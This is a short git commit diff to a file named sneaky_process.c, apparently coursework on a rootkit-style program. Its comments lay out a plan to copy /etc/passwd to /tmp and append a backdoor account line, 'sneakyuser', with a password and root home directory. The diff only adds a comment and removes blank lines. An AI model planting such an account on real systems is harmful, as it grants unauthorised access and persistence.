7f1ed98f49c3227e85583fb5960f14204c380a45
Nisarg <nisargdbh@gmail.com>
2018-04-13 12:54:55 -0400

    Updates

--- sneaky_process.c
+++ sneaky_process.c
@@ -4,9 +4,7 @@
 
 2. open /etc/passwd file, print new line to end of file with a username and password that will allow a desired user to authenticate tothe system: sneakyuser:abs123:2000:2000:sneakyuser:/root:bash
 
-
-
-
-
-
 */
+
+
+//1. Copy /etc/asswd file to new file --> /tmp/passwd
